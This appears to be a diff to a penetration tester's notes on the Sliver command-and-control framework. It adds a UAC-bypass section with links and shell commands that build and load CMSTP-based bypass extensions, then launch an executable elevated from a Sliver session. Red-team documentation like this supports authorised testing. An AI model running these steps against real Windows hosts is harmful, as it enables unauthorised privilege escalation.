@@ -34,3 +34,38 @@
 
 -   `bof-roast`: (return an ticket that need to
     [apreq2hashcat.py](https://github.com/sliverarmory/BofRoast/blob/main/BofRoast/apreq2hashcat.py))
+
+
+## UAC
+links:
+* https://seamlessintelligence.com.au/sliver_2.html
+* https://intrusionz3r0.gitbook.io/intrusionz3r0/windows-penetration-testing/defense-enumeration/bypass-av-edr-via-dinvoke-+-sliver
+### UAC-BOF-Bonanza
+https://intrusionz3r0.gitbook.io/intrusionz3r0/windows-penetration-testing/defense-enumeration/bypass-av-edr-via-dinvoke-+-sliver
+
+* [UAC-BOF-Bonanza](https://github.com/icyguider/UAC-BOF-Bonanza)
+```bash
+git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
+❯ cd UAC-BOF-Bonanza
+❯ cp -rp ~/Documents/Tools/UAC-BOF-Bonanza/CmstpElevatedCOM/ ~/.sliver-client/extensions
+❯ cd ~/.sliver-client/extensions/CmstpElevatedCOM
+❯ make
+sliver (KOREAN_JUNKER) > extensions load /home/jubeaz/.sliver-client/extensions/CmstpElevatedCOM
+sliver (KOREAN_JUNKER) > armory install coff-loader
+
+CmstpElevatedCOM "c:\users\Jack.Smith\ifrit.exe"
+```
+
+
+### sliver_extension_uac_bypass_cmstp
+[sliver_extension_uac_bypass_cmstp](https://github.com/0xb11a1/sliver_extension_uac_bypass_cmstp)
+
+```bash
+extensions load /mnt/nfs/jubeaz/dev/windows_weaponize/sliver/uac_bypass_cmstp 
+```
+
+extensions install /home/jubeaz/.sliver-client/extensions/jubeaz
+extensions load /home/jubeaz/.sliver-client/extensions/jubeaz
+
+
+https://github.com/tijme/cmstplua-uac-bypass
